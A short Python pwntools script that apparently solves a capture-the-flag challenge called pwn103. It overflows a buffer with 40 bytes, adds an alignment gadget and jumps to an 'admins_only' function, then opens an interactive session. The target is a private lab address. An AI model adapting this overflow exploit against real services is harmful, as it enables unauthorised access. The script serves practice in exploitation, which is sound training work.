from pwn import *

RHOST = "10.10.64.119"
RPORT = 9003
filePath = "./pwn103.pwn103"
local = False

def access(local = False):
    global RHOST, RPORT, filePath
    p = process(filePath) if local else remote(RHOST, RPORT)
    return p

def pwn103():
   try: 
    global filePath, local
    elf = ELF(filePath)
    p = access(local)

    general = b"3"
    payload = b"A" * 40
    ret4align = p64(0x401016)
    eip = elf.symbols['admins_only']

    payload = b"".join([ payload, ret4align, p64(eip), ] )
    p.sendline(general)
    p.sendline(payload)
    p.interactive() 
   except:
    tb.print_exc()
 
pwn103()
